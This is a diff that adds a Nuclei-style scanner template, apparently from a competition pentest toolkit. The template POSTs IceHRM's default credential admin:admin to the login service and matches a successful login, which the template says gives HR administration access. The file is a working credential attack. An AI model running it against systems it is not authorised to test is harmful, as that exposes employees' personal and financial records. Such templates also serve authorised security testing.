@@ -1,0 +1,52 @@
+# IceHrm default credential login attempt.
+id: icehrm-default-login
+
+info:
+  name: IceHRM Default Credentials
+  author: cptc-toolkit
+  severity: high
+  metadata:
+    max-request: 1
+    kind: attack
+  description: |
+    IceHRM is a self-hosted HR management platform. Stock installs document
+    the default admin credential admin:admin and the application does not
+    force a change on first login.
+
+    This template POSTs the default credential to the IceHRM login service.
+    A match means HR administration access: employee records, leave and
+    expense data, documents and the company structure.
+
+    One POST request. The credential is a documented vendor default.
+  reference:
+    - https://github.com/gamonoid/icehrm
+  tags: hr,icehrm,default-login,attack
+
+http:
+  - raw:
+      - |
+        POST /service.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        t=login&user=admin&pass=admin&type=api
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        condition: or
+        words:
+          - '"status":"success"'
+      - type: dsl
+        dsl:
+          - "contains(to_lower(content_type), 'json')"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - '"status":"error"'
+          - '"error"'
